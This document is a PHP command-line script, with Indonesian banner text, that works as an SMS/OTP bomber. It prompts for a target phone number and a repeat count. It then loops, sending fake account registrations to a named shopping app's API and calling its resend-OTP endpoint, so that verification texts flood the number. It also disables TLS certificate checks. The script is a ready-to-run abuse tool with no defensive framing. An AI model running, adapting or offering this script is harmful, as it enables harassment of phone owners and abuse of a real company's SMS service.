<?php
//error_reporting(E_ALL);
date_default_timezone_set('Asia/Jakarta');
echo "\e[96m + ==================+\e[0m\n";
echo "\e[33m NGEHEK SMS ALLOPERATOR\e[0m\e[0m \n";
echo "\e[33m Create : Icannnnart \e[0m\e[0m\e[0m\n";
echo "\e[33m HAJAR BANG SELAGI NO LIMIT AKWOKAOWKAO \e[0m\n";
echo "\e[96m + ===================+\e[0m\n";

echo "\e[0;33m [+] Masuki Nomerya [example : 85155111111]\e[0m: ";
$nomernya = trim(fgets(STDIN));

echo "\e[96m [?] Jumlah \e[0m: ";
$jmlh = trim(fgets(STDIN));
$i = 0;
$urls = "https://api.pasarnow.com/api/registerPasarnowUser";
while($i < $jmlh) {
$curl = curl_init($urls);
curl_setopt($curl, CURLOPT_URL, $urls);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headerss = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headerss);

$dataa = '{"first_name":"ucuo","last_name":"ucup","gender":"male","dob":"2000-01-20T14:25:42.068+07:00","mobile_phone":"+628'.$nomernya.'","referrer_mobile_phone":"","mitra_suffix":"","password":"Qwerty","confirm_password":"Qwerty"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $dataa);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
if(strpos($resp,"Nomor sudah terdaftar!")){
   $url = "https://api.pasarnow.com/api/resendOTPCode";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile_phone":"+62'.$nomernya.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
echo "\e[33m [ SUKSES NGEHEK ]\e[0m\n" .PHP_EOL;
}elseif(strpos($resp,"Successfully created account and sent activation code")){
echo "\e[33m\n [ OTW ngehek ]\e[0m\n" .PHP_EOL;
$url = "https://api.pasarnow.com/api/resendOTPCode";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "Content-Type: application/json",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

$data = '{"mobile_phone":"+62'.$nomernya.'"}';

curl_setopt($curl, CURLOPT_POSTFIELDS, $data);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
curl_close($curl);
echo "\e[33m [ SUKSES NGEHEK ]\e[0m\n" .PHP_EOL;
}else{
echo "\e[91m [ GAGAL ]\e[0m\n".PHP_EOL;

 }  
 $i++;
 }
  echo "\e[33mANYJAY NGEHEK\e[0m\n";
